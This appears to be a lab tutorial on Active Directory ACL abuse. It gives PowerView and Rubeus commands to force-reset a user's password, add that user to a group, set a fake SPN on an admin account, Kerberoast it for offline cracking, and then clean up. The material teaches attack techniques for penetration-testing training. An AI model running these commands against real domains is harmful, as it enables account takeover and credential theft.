# ACL Abuse Tactics
## Abusing ACLs

So, first, we must authenticate as wley and force change the password of the user damundsen. We can start by opening a PowerShell console and authenticating as the wley user. Otherwise, we could skip this step if we were already running as this user. To do this, we can create a PSCredential object.

### Creating a PSCredential Object
```
PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 
```

### Creating a SecureString Object
```
PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

### Changing the User's Password
```
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

We can see that the command completed successfully, changing the password for the target user while using the credentials we specified for the wley user that we control. Next, we need to perform a similar process to authenticate as the damundsen user and add ourselves to the Help Desk Level 1 group.

### Creating a SecureString Object using damundsen
```
PS C:\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
```

Next, we can use the Add-DomainGroupMember function to add ourselves to the target group

### Adding damundsen to the Help Desk Level 1 Group
```
PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

PS C:\htb> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
```

### Confirming damundsen was Added to the Group
```
PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```

At this point, we should be able to leverage our new group membership to take control over the adunn user. Now, let's say that our client permitted us to change the password of the damundsen user, but the adunn user is an admin account that cannot be interrupted. Since we have GenericAll rights over this account, we can have even more fun and perform a targeted Kerberoasting attack by modifying the account's servicePrincipalName attribute to create a fake SPN that we can then Kerberoast to obtain the TGS ticket and (hopefully) crack the hash offline using Hashcat.

We must be authenticated as a member of the Information Technology group for this to be successful. Since we added damundsen to the Help Desk Level 1 group, we inherited rights via nested group membership. We can now use Set-DomainObject to create the fake SPN. We could use the tool targetedKerberoast to perform this same attack from a Linux host, and it will create a temporary SPN, retrieve the hash, and delete the temporary SPN all in one command.

### Creating a Fake SPN
```
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

### Kerberoasting with Rubeus
```
PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap
```

## Cleanup
### Removing the Fake SPN from adunn's Account
```
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```

### Removing damundsen from the Help Desk Level 1 Group
```
PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```

### Confirming damundsen was Removed from the Group
```
PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```